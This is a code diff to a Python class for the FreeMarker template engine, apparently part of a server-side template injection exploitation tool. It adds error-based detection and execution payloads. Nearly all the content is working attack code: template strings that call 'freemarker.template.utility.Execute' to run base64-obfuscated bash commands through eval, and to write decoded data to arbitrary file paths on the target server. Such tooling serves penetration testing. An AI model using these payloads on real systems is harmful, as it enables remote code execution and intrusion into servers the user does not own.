@@ -25,6 +25,13 @@ class Freemarker(java.Java):
                 'test_render': f"""${{{rand.randints[0]}}}<#--{rand.randints[1]}-->${{{rand.randints[2]}}}""",
                 'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '<#--${{1/0}}-->${{(({header[0]}+{header[1]})?c+',
+                'trailer': '+({trailer[0]}+{trailer[1]})?c)?new()}}',
+                'test_render': f"""({rand.randints[0]})?c+({rand.randints[2]})?c""",
+                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
+            },
             'write': {
                 'call': 'inject',
                 'write': """${{"freemarker.template.utility.Execute"?new()("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}") }}""",
@@ -38,6 +45,10 @@ class Freemarker(java.Java):
             'execute': {
                 'call': 'render',
                 'execute': """${{"freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}") }}"""
+            },
+            'execute_error': {
+                'call': 'render',
+                'execute': """("freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))"""
             }
         })
 
